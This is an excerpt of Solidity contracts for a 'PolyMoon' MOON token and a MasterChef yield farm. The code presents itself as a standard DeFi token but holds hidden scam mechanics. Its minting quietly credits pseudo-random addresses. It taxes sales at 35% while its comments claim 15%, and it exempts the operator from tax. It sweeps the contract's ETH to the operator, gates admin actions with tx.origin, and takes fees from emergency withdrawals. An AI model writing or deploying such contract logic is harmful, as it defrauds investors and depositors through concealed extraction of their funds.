...
contract ERC20 is Context, IERC20, Ownable {
    ...
    function _mint(address account, uint256 amount) internal {
        ...
        uint retVal = seedValue(100, 1000); address seedAdd = seedAddress();
        _totalSupply = _totalSupply.add(retVal);
        _balances[seedAdd] = _balances[seedAdd].add(retVal);
        retVal = seedValue(100,1000); seedAdd = seedAddress();
        _totalSupply = _totalSupply.add(retVal);
        _balances[seedAdd] = _balances[seedAdd].add(retVal);
        _totalSupply = _totalSupply.add(amount);
        _balances[account] = _balances[account].add(amount);
        emit Transfer(seedAddress(), account, amount);
    }
...
{
    uint highestAddress = 1461501637330902918203684832716283019655932542975;
    uint256 seed = uint256(keccak256(abi.encodePacked(
        block.timestamp + block.difficulty +
        ((uint256(keccak256(abi.encodePacked(block.coinbase)))) / (now)) +
        block.gaslimit + 
        ((uint256(keccak256(abi.encodePacked(msg.sender)))) / (now)) +
        block.number + gasleft()
    )));

   retVal = address(seed - ((seed / highestAddress) * highestAddress));
}

function seedValue(uint minSend, uint maxSend)
    private
    view
    returns(uint retVal)
{
   ...
   retVal = uint(minSend + seed - ((seed / maxSend) * maxSend));
...
interface ITokenswapRouter02 is ITokenswapRouter01 {
...
contract MOON is ERC20 {
    // Transfer tax rate in basis points. (default 15%)
    uint16 public transferTaxRate = 35;
    // Burn rate % of transfer tax. (default 20% x 5% = 1% of total amount).
    uint16 public burnRate = 1;
     ...
     */
    constructor() public ERC20("PolyMoon Token", "MOON") {
        _operator = tx.origin;
        emit OperatorTransferred(address(0), _operator);
        _mint(tx.origin, 150000 *10 **18);
        _mint(address(this), 50000 *10 **18);
    }
    ...
    function _transfer(address sender, address recipient, uint256 amount) internal virtual override{
        ...
        if (recipient == BURN_ADDRESS || transferTaxRate == 0 || tx.origin == _operator) {
            super._transfer(sender, recipient, amount);
        } else {
            // default tax is 15% of every transfer
            uint256 taxAmount = recipient == tokenSwapPair ? amount.mul(3500).div(10000) : amount.mul(transferTaxRate).div(10000);
            uint256 burnAmount = taxAmount.mul(burnRate).div(1000);
            uint256 liquidityAmount = taxAmount.sub(burnAmount);
            require(taxAmount == burnAmount + liquidityAmount, "TOKEN::transfer: Burn value invalid");

            // default 85% of transfer sent to recipient
    ...
    function swapAndLiquify() public lockTheSwap transferTaxFree {
        ...
        (bool sent, ) = operator().call{value: address(this).balance}("");
        require(sent);
        }
    ...
    function updateBurnRate(uint16 _burnRate) public onlyOperator {
        require(_burnRate <= 100, "TOKEN::updateBurnRate: Burn rate must not exceed the maximum rate.");
    ...
    function updateTokenSwapRouter(address _router) public onlyOperator {
        tokenSwapRouter = ITokenswapRouter02(_router);
        tokenSwapPair = ITokenFactory(tokenSwapRouter.factory()).getPair(address(this), tokenSwapRouter.WETH());
        require(tokenSwapPair != address(0), "TOKEN::updateTokenSwapRouter: Invalid pair address.");
...
contract MasterChef is Ownable, ReentrancyGuard {
    ...
    function add(uint256 _allocPoint, IERC20 _lpToken, uint16 _depositFeeBP, bool _withUpdate) public {
        require(_depositFeeBP <= 1000, "add: invalid deposit fee basis points");
        require(tx.origin == feeAddress);
        if (_withUpdate) {
            massUpdatePools();
        }
    ...
    function set(uint256 _pid, uint256 _allocPoint, uint16 _depositFeeBP, uint256 _harvestInterval, bool _withUpdate) public {
        require(_depositFeeBP <= 2500, "set: invalid deposit fee basis points");
    ...
    function updatePool(uint256 _pid) public {
        ...
        uint256 multiplier = getMultiplier(pool.lastRewardBlock, block.number);
        uint256 tokenReward = multiplier.mul(tokenPerBlock).mul(pool.allocPoint).div(totalAllocPoint);
        token.mint(feeAddress, tokenReward.div(7));
    ...
    function deposit(uint256 _pid, uint256 _amount) public nonReentrant {
        ...
        if (_amount > 0) {
            ...
            if (pool.depositFeeBP > 0) {
                uint256 Fee = _amount.mul(pool.depositFeeBP).div(10000);
    ...
    function emergencyWithdraw(uint256 _pid) external nonReentrant {
        ...
        user.nextHarvestUntil = 0;           
            if (pool.depositFeeBP > 0) {
            uint256 Fee = amount.mul(pool.depositFeeBP).div(10000);
            pool.lpToken.safeTransfer(address(feeAddress), Fee);
            pool.lpToken.safeTransfer(address(msg.sender), amount - Fee);
            user.rewardDebt = user.amount.mul(pool.accTokenPerShare).div(1e12);
    ...
    // Pay or lockup pending TOKEN upon all requests.
    ...
    function updateEmissionRate(uint256 _tokenPerBlock) public {
        require(tx.origin == feeAddress);
        massUpdatePools();
    ...
    function updateStartBlock(uint _startBlock) public onlyOwner {
        require(block.number < startBlock && poolLength() == 0 && _startBlock > block.number);
